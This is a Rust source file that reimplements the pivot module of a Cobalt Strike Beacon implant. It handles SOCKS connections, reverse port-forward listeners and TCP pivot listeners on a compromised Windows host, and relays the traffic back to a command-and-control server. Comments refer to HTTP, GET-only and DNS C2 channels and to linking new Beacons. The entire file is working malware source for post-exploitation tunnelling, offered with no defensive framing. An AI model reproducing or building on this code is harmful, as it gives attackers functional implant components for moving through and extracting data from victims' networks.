//! Pivot (SOCKS / port forward / TCP pivot) socket management (pivot.cpp).

use crate::bformat::FormatP;
use crate::callback::{post_error_d, Callback};
use crate::channel_tcp::channel_winsock_init;
use crate::commands::{CALLBACK_ACCEPT, CALLBACK_CLOSE, CALLBACK_CONNECT, CALLBACK_READ};
use crate::link::{channel_reverse_tcp, link_register};
use crate::link_tcp::lchannel_tcp;
use crate::parse::DataP;
use parking_lot::Mutex;
use std::sync::atomic::{AtomicU32, Ordering};
use windows_sys::Win32::Networking::WinSock::*;
use windows_sys::Win32::System::SystemInformation::GetTickCount;
use windows_sys::Win32::System::Threading::Sleep;

const SOCKET_READ_MAX: usize = 1048576;

const STATE_DEAD: u32 = 0;
const STATE_READ: u32 = 1;
const STATE_CONNECT: u32 = 2;

const LISTEN_NOTREALLY: u32 = 0;
const LISTEN_ONEOFF: u32 = 1;
const LISTEN_PERSISTENT: u32 = 2;
const LISTEN_TCPPIVOT: u32 = 3;

/// One entry of the pivot socket list (`socket_entry`).
#[derive(Clone, Copy)]
struct SocketEntry {
    id: u32,
    state: u32,
    timeout: u32,
    linger: u32,
    ltype: u32,
    lport: u32,
    start: u32,
    socket: usize,
}

/// The pivot socket list (pivot.cpp `pivot_list`). `pivot_poll_reaper()`
/// cleans dead entries out of this list.
static PIVOT_LIST: Mutex<Vec<SocketEntry>> = Mutex::new(Vec::new());

/// Shared buffer for read data (pivot.cpp `read_buffer`), lazily sized.
static READ_BUFFER: Mutex<Vec<u8>> = Mutex::new(Vec::new());

/// Listening socket ID pool (pivot.cpp `lsock_id`).
static LSOCK_ID: AtomicU32 = AtomicU32::new(0);

/// Recv exactly `len` bytes (recv_all). On error the socket is shut down,
/// closed, and `SOCKET_ERROR` is returned.
fn recv_all(my_sock: usize, buffer: &mut [u8], len: usize) -> i32 {
    let mut tret: usize = 0;
    while tret < len {
        let nret = unsafe { recv(my_sock, buffer[tret..].as_mut_ptr() as *mut _, (len - tret) as i32, 0) };
        if nret == SOCKET_ERROR || nret == 0 {
            unsafe {
                shutdown(my_sock, SD_BOTH);
                closesocket(my_sock);
            }
            return SOCKET_ERROR;
        }
        tret += nret as usize;
    }
    tret as i32
}

/// Add a socket to our list of sockets (_add_socket). Any existing entry
/// with the same id is invalidated (marked `STATE_DEAD`), then the new
/// entry is prepended.
fn _add_socket(socket: usize, id: u32, timeout: u32, ltype: u32, lport: u32, state: u32) {
    let mut list = PIVOT_LIST.lock();
    for entry in list.iter_mut() {
        if entry.id == id {
            entry.state = STATE_DEAD;
        }
    }
    list.insert(
        0,
        SocketEntry {
            id,
            state,
            timeout,
            linger: 0,
            ltype,
            lport,
            start: unsafe { GetTickCount() },
            socket,
        },
    );
}

/// Add a connecting socket (add_socket).
fn add_socket(socket: usize, id: u32, timeout: u32) {
    _add_socket(socket, id, timeout, LISTEN_NOTREALLY, 0, STATE_CONNECT);
}

/// Listen for a connection now (generic_listen). Returns the listening
/// socket (non-blocking, bound and listening) or `INVALID_SOCKET`.
fn generic_listen(bindto: u32, port: u16, backlog: u32) -> usize {
    channel_winsock_init();
    unsafe {
        let my_sock = socket(AF_INET as i32, SOCK_STREAM, 0);
        if my_sock == INVALID_SOCKET {
            return INVALID_SOCKET;
        }

        let mut sock: SOCKADDR_IN = std::mem::zeroed();
        sock.sin_family = AF_INET as u16;
        sock.sin_port = htons(port);
        sock.sin_addr.S_un.S_addr = bindto;

        // make the SOCKET non-blocking
        let mut mode: u32 = 1;
        if ioctlsocket(my_sock, FIONBIO, &mut mode) == SOCKET_ERROR {
            closesocket(my_sock);
            return INVALID_SOCKET;
        }

        // make it into a server
        if bind(
            my_sock,
            &sock as *const SOCKADDR_IN as *const SOCKADDR,
            std::mem::size_of::<SOCKADDR_IN>() as i32,
        ) == SOCKET_ERROR
        {
            closesocket(my_sock);
            return INVALID_SOCKET;
        }

        // listen for a connection... *pHEAR*
        if listen(my_sock, backlog as i32) == SOCKET_ERROR {
            closesocket(my_sock);
            return INVALID_SOCKET;
        }

        my_sock
    }
}

/// Listen for a connection now (command_listen).
///
/// Wire format: `[id : 4 bytes][port : 2 bytes]`. (This fork's C++ omits
/// the `data_init` call; the parser is initialized here so the id/port are
/// read from the buffer as in the upstream source.)
pub fn command_listen(buffer: &[u8], length: usize, callback: Callback) {
    let mut parser = DataP::init(&mut buffer[..length.min(buffer.len())].to_vec());
    let id = parser.data_int();
    let port = parser.data_short();

    let my_sock = generic_listen(INADDR_ANY, port, 1);

    if my_sock == INVALID_SOCKET {
        let clen = 4.min(length);
        callback(&buffer[..clen], clen as i32, CALLBACK_CLOSE);
    } else {
        _add_socket(my_sock, id, 180000, LISTEN_ONEOFF, port as u32, STATE_CONNECT);
    }
}

/// Attempt to create a connection and store it for polling later
/// (command_connect).
///
/// Wire format: `[id : 4 bytes][port : 2 bytes][host : the rest]`.
pub fn command_connect(buffer: &[u8], length: usize, callback: Callback) {
    // [id : 4 bytes][port : 2 bytes][host : the rest]
    if length < 6 {
        return;
    }

    // parse our id value (raw/network order; fid is used for callbacks)
    let id = u32::from_be_bytes([buffer[0], buffer[1], buffer[2], buffer[3]]);

    // parse our port value
    let port = u16::from_be_bytes([buffer[4], buffer[5]]);

    // parse out the host value
    let hlen = (length - 6).min(1023);
    let mut host = vec![0u8; hlen + 1];
    host[..hlen].copy_from_slice(&buffer[6..6 + hlen]);

    channel_winsock_init();

    unsafe {
        let my_sock = socket(AF_INET as i32, SOCK_STREAM, 0);
        if my_sock == INVALID_SOCKET {
            callback(&buffer[..4], 4, CALLBACK_CLOSE);
            return;
        }

        // resolve our target
        let target = gethostbyname(host.as_ptr() as *const _);
        if target.is_null() {
            closesocket(my_sock);
            callback(&buffer[..4], 4, CALLBACK_CLOSE);
            return;
        }

        // copy our target information into the sock
        let mut sock: SOCKADDR_IN = std::mem::zeroed();
        let addr = *(*target).h_addr_list.offset(0) as *const u8;
        std::ptr::copy_nonoverlapping(
            addr,
            &mut sock.sin_addr.S_un.S_addr as *mut u32 as *mut u8,
            (*target).h_length as usize,
        );
        sock.sin_family = AF_INET as u16;
        sock.sin_port = htons(port);

        // make the SOCKET non-blocking
        let mut mode: u32 = 1;
        if ioctlsocket(my_sock, FIONBIO, &mut mode) == SOCKET_ERROR {
            closesocket(my_sock);
            callback(&buffer[..4], 4, CALLBACK_CLOSE);
            return;
        }

        // issue our connection
        let status = connect(
            my_sock,
            &sock as *const SOCKADDR_IN as *const SOCKADDR,
            std::mem::size_of::<SOCKADDR_IN>() as i32,
        );
        if status == SOCKET_ERROR && WSAGetLastError() != WSAEWOULDBLOCK {
            closesocket(my_sock);
            callback(&buffer[..4], 4, CALLBACK_CLOSE);
            return;
        }

        add_socket(my_sock, id, 30000);
    }
}

/// Find out when the socket is ready for data and send it (send_helper).
/// Spends at most ~30s trying to write the data out.
fn send_helper(socket: usize, buffer: &[u8], length: usize) {
    let tv = TIMEVAL {
        tv_sec: 0,
        tv_usec: 100,
    };
    let timeout = unsafe { GetTickCount() } + 30000; // max of 30s to write out to socket

    while unsafe { GetTickCount() } < timeout {
        let mut s_write = FD_SET::default();
        let mut s_error = FD_SET::default();

        fd_set(&mut s_write, socket);
        fd_set(&mut s_error, socket);

        unsafe {
            select(0, std::ptr::null_mut(), &mut s_write, &mut s_error, &tv);
        }

        if fd_isset(&s_error, socket) {
            return;
        } else if fd_isset(&s_write, socket) {
            let status = unsafe { send(socket, buffer.as_ptr() as *const _, length as i32, 0) };
            if status == SOCKET_ERROR && unsafe { WSAGetLastError() } == WSAEWOULDBLOCK {
                // We should try this operation again in a little bit
                unsafe { Sleep(1000) };
            } else {
                return;
            }
        }
    }
}

/// Wire format: `[id : 4 bytes][data : the rest]` (command_send).
pub fn command_send(buffer: &[u8], length: usize) {
    if length < 4 {
        return;
    }
    let id = u32::from_be_bytes([buffer[0], buffer[1], buffer[2], buffer[3]]);

    // Collect the matching sockets first so we don't hold the list lock
    // while `send_helper` blocks waiting for the socket to become writable.
    let targets: Vec<usize> = {
        let list = PIVOT_LIST.lock();
        list.iter()
            .filter(|e| e.state == STATE_READ && e.id == id)
            .map(|e| e.socket)
            .collect()
    };

    for socket in targets {
        // if we have a match, send the data
        send_helper(socket, &buffer[4..length], length - 4);
    }
}

/// Wire format: `[id : 4 bytes]` (command_close).
pub fn command_close(buffer: &[u8], length: usize) {
    if length < 4 {
        return;
    }
    let id = u32::from_be_bytes([buffer[0], buffer[1], buffer[2], buffer[3]]);

    let mut list = PIVOT_LIST.lock();
    for entry in list.iter_mut() {
        // skip dead sockets
        if entry.state == STATE_DEAD {
            continue;
        }
        // if we have a match, kill the socket
        if id == entry.id && entry.ltype != LISTEN_PERSISTENT {
            entry.state = STATE_DEAD;
        }
    }
}

/// Next listening socket id (nextId).
fn next_id() -> u32 {
    let id = LSOCK_ID.fetch_add(1, Ordering::Relaxed);
    (id % 67108864) + 67108864
}

/// Check for sockets that are now connected and ready to use
/// (pivot_poll_checker).
fn pivot_poll_checker(callback: Callback) {
    // Sockets accepted by a LISTEN_PERSISTENT listener are added after the
    // walk (they must not be visited by the current pass, matching the C
    // list prepend + `temp = temp->next` traversal).
    let mut pending_adds: Vec<(usize, u32, u32, u32, u32, u32)> = Vec::new();
    // TCP pivot accepts are handed to link_register after the walk.
    let mut pending_links: Vec<(usize, u32)> = Vec::new();

    let tv = TIMEVAL {
        tv_sec: 0,
        tv_usec: 100,
    };

    {
        let mut list = PIVOT_LIST.lock();
        let mut i = 0;
        while i < list.len() {
            // we only deal in sockets that are waiting to connect
            if list[i].state != STATE_CONNECT {
                i += 1;
                continue;
            }

            let fid = unsafe { htonl(list[i].id) };
            let sock = list[i].socket;

            // zero out our set and add the socket to it
            let mut s_write = FD_SET::default();
            let mut s_error = FD_SET::default();
            let mut s_read = FD_SET::default();
            fd_set(&mut s_write, sock);
            fd_set(&mut s_error, sock);
            fd_set(&mut s_read, sock);

            // do we have a connection?
            unsafe {
                select(0, &mut s_read, &mut s_write, &mut s_error, &tv);
            }

            // one of our reverse port forwards
            if list[i].ltype == LISTEN_PERSISTENT {
                // a listening socket is ready to accept a connection
                if fd_isset(&s_read, sock) {
                    let mut mode: u32 = 1; // enable non-blocking I/O

                    // accept the connection
                    let lsock = unsafe { accept(sock, std::ptr::null_mut(), std::ptr::null_mut()) };

                    // put the socket into non-blocking mode and continue on...
                    if unsafe { ioctlsocket(lsock, FIONBIO, &mut mode) } != SOCKET_ERROR {
                        // assign an id to it
                        let newfid = next_id();

                        // register this socket with STATE_READ
                        pending_adds.push((lsock, newfid, 180000, LISTEN_NOTREALLY, 0, STATE_READ));

                        // let the controller know we have a new connection
                        let mut result = FormatP::init(128);
                        result.bformat_int(newfid as i32);
                        result.bformat_int(list[i].lport as i32);
                        let blen = result.bformat_length();
                        callback(result.bformat_string(), blen as i32, CALLBACK_ACCEPT);
                    } else {
                        // if we failed to go to non-blocking mode, close the socket
                        unsafe {
                            closesocket(lsock);
                        }
                        break; // C: return -- abort the whole checker walk
                    }
                }
            }
            // a TCP pivot. :)
            else if list[i].ltype == LISTEN_TCPPIVOT {
                // a listening socket is ready to accept a connection
                if fd_isset(&s_read, sock) {
                    // accept the connection
                    let lsock = unsafe { accept(sock, std::ptr::null_mut(), std::ptr::null_mut()) };

                    // register this as a named pipe Beacon, please
                    pending_links.push((lsock, list[i].lport));
                }
            }
            // treat SOCKS sockets differently... thanks!
            else {
                // is the socket dead?
                if fd_isset(&s_error, sock) {
                    list[i].state = STATE_DEAD;
                    callback(&fid.to_ne_bytes(), 4, CALLBACK_CLOSE);
                }
                // is the socket alive and ready to write to?
                else if fd_isset(&s_write, sock) {
                    list[i].state = STATE_READ;
                    callback(&fid.to_ne_bytes(), 4, CALLBACK_CONNECT);
                }
                // a listening socket is ready to accept a connection
                else if fd_isset(&s_read, sock) {
                    // store the listening socket
                    let lsock = list[i].socket;

                    // accept the connection
                    let acc = unsafe { accept(lsock, std::ptr::null_mut(), std::ptr::null_mut()) };

                    if acc == INVALID_SOCKET {
                        // if something went wrong, report it as a failure
                        list[i].state = STATE_DEAD;
                        callback(&fid.to_ne_bytes(), 4, CALLBACK_CLOSE);
                    } else {
                        // otherwise, we're ready to rock, let's do it!
                        list[i].state = STATE_READ;
                        list[i].socket = acc;
                        callback(&fid.to_ne_bytes(), 4, CALLBACK_CONNECT);
                    }

                    // close the listening socket, we don't need it anymore
                    unsafe {
                        closesocket(lsock);
                    }
                }
                // this socket is dead, or we're not waiting for it anyways
                else if (unsafe { GetTickCount() } - list[i].start) > list[i].timeout {
                    list[i].state = STATE_DEAD;
                    callback(&fid.to_ne_bytes(), 4, CALLBACK_CLOSE);
                }
            }

            i += 1;
        }
    }

    for (sock, id, timeout, ltype, lport, state) in pending_adds {
        _add_socket(sock, id, timeout, ltype, lport, state);
    }
    for (lsock, lport) in pending_links {
        let _ = link_register(lchannel_tcp(lsock as isize), channel_reverse_tcp(lport as i32), callback);
    }
}

/// Clean up dead sockets from our list (pivot_poll_reaper). Sockets are
/// killed 1s after being marked dead, to allow any unsent data to get out.
fn pivot_poll_reaper(_callback: Callback) {
    let mut list = PIVOT_LIST.lock();
    let mut i: usize = 0;
    let mut prev: Option<usize> = None;

    while i < list.len() {
        let state = list[i].state;
        if state == STATE_DEAD && list[i].linger == 0 {
            list[i].linger = unsafe { GetTickCount() };
            prev = Some(i);
            i += 1;
        }
        // kill sockets after 1s... to allow any unsent data to get sent please
        else if state == STATE_DEAD && (unsafe { GetTickCount() } - list[i].linger) > 1000 {
            let ltype = list[i].ltype;
            let sock = list[i].socket;

            // shutdown the socket
            if ltype == LISTEN_NOTREALLY {
                unsafe {
                    shutdown(sock, SD_BOTH);
                }
            }

            // do not let go of this item until socket is really dead. Thanks!
            if unsafe { closesocket(sock) } != 0 && ltype == LISTEN_PERSISTENT {
                prev = Some(i);
                i += 1;
                continue;
            }

            // unlink the socket from our list
            match prev {
                None => {
                    // C: temp = NULL -- the walk ends after removing the head
                    list.remove(i);
                    break;
                }
                Some(p) => {
                    list.remove(i);
                    i = p + 1; // temp = prev->next
                }
            }
        } else {
            prev = Some(i);
            i += 1;
        }
    }
}

/// Check for sockets ready to be read from (pivot_poll_reader). Returns
/// the number of successful reads.
fn pivot_poll_reader(callback: Callback) -> i32 {
    // allocate our read buffer plz
    let mut rb = READ_BUFFER.lock();
    if rb.len() < SOCKET_READ_MAX {
        rb.resize(SOCKET_READ_MAX, 0);
    }

    let mut read = 0i32;
    let mut list = PIVOT_LIST.lock();
    let mut i = 0;
    while i < list.len() {
        // if the socket is dead, go to the next item
        if list[i].state != STATE_READ {
            i += 1;
            continue;
        }

        // fix the id and copy the connection id to the beginning of the buffer
        let fid = unsafe { htonl(list[i].id) };
        rb[..4].copy_from_slice(&fid.to_ne_bytes());

        // how many bytes are available for reading?
        let mut count: u32 = 0;
        let status = unsafe { ioctlsocket(list[i].socket, FIONREAD, &mut count) };

        // we have a fixed buffer, let's not overdo it
        if count > (SOCKET_READ_MAX - 4) as u32 {
            count = (SOCKET_READ_MAX - 4) as u32;
        }

        // did an error occur? kill our socket!
        if status == SOCKET_ERROR {
            list[i].state = STATE_DEAD;
            callback(&rb[..4], 4, CALLBACK_CLOSE);
        } else if count > 0 {
            // read in our data, plz
            let ret = recv_all(list[i].socket, &mut rb[4..4 + count as usize], count as usize);

            // something went wrong? seriously?
            if ret == SOCKET_ERROR {
                list[i].state = STATE_DEAD;
                callback(&rb[..4], 4, CALLBACK_CLOSE);
            }
            // ok, we're all good...
            else if ret == count as i32 {
                // post the data plz
                callback(&rb[..4 + count as usize], (4 + count) as i32, CALLBACK_READ);
                read += 1;
            }
        }

        i += 1;
    }
    read
}

/// Poll all of our sockets, see if there's anything to be read, read it,
/// and post it all back to Cobalt Strike (pivot_poll).
pub fn pivot_poll(callback: Callback) {
    // check for connections
    pivot_poll_checker(callback);

    // we are only going to allow reads to block for 3.5s... with HTTP POST C2
    // we'll never hit this, but with GET ONLY and DNS it's a risk that ongoing
    // reads can starve everything else
    let stopat = unsafe { GetTickCount() } + 3500;

    // keep reading while we have data to read please
    loop {
        let read = pivot_poll_reader(callback);
        if !(read > 0 && unsafe { GetTickCount() } < stopat) {
            break;
        }
    }

    // clean up any dead sockets
    pivot_poll_reaper(callback);
}

/// Is this port already bound by a persistent listener? (is_bound)
fn is_bound(port: u16) -> bool {
    let list = PIVOT_LIST.lock();
    for entry in list.iter() {
        if entry.state != STATE_DEAD && entry.ltype == LISTEN_PERSISTENT && entry.lport == port as u32 {
            return true;
        }
    }
    false
}

/// Bind a socket (command_socket_bind). Wire format: `[port : 2 bytes]`.
pub fn command_socket_bind(buffer: &[u8], length: usize, bindto: u32) {
    let mut parser = DataP::init(&mut buffer[..length.min(buffer.len())].to_vec());
    let port = parser.data_short();

    // if we're already bound and managed here... do nothing
    if is_bound(port) {
        return;
    }

    // setup our listening socket
    let my_sock = generic_listen(bindto, port, 10);

    // process the socket when it's up
    if my_sock != INVALID_SOCKET {
        _add_socket(my_sock, next_id(), 0, LISTEN_PERSISTENT, port as u32, STATE_CONNECT);
    } else {
        post_error_d(0x15, port as i32);
    }
}

/// Bind a socket (command_socket_tcppivot). Wire format: `[port : 2 bytes]`.
pub fn command_socket_tcppivot(buffer: &[u8], length: usize) {
    let mut parser = DataP::init(&mut buffer[..length.min(buffer.len())].to_vec());
    let port = parser.data_short();

    // setup our listening socket
    let my_sock = generic_listen(INADDR_ANY, port, 10);

    // process the socket when it's up
    if my_sock != INVALID_SOCKET {
        _add_socket(my_sock, next_id(), 0, LISTEN_TCPPIVOT, port as u32, STATE_CONNECT);
    } else {
        post_error_d(0x15, port as i32);
    }
}

/// Close a bound socket (command_socket_close). Wire format: `[port : 2 bytes]`.
pub fn command_socket_close(buffer: &[u8], length: usize) {
    let mut parser = DataP::init(&mut buffer[..length.min(buffer.len())].to_vec());
    let port = parser.data_short();

    let mut list = PIVOT_LIST.lock();
    for entry in list.iter_mut() {
        // skip dead sockets
        if entry.state == STATE_DEAD {
            continue;
        }

        // if we have a match, kill the socket
        if entry.ltype == LISTEN_PERSISTENT && entry.lport == port as u32 {
            entry.state = STATE_DEAD;
        } else if entry.ltype == LISTEN_TCPPIVOT && entry.lport == port as u32 {
            entry.state = STATE_DEAD;
        }
    }
}

/// FD_SET (windows-sys has no macro; FD_SET::default() already zeroes)
fn fd_set(set: &mut FD_SET, fd: usize) {
    if (set.fd_count as usize) < set.fd_array.len() {
        set.fd_array[set.fd_count as usize] = fd;
        set.fd_count += 1;
    }
}

/// FD_ISSET
fn fd_isset(set: &FD_SET, fd: usize) -> bool {
    unsafe { __WSAFDIsSet(fd, set as *const FD_SET as *mut FD_SET) != 0 }
}
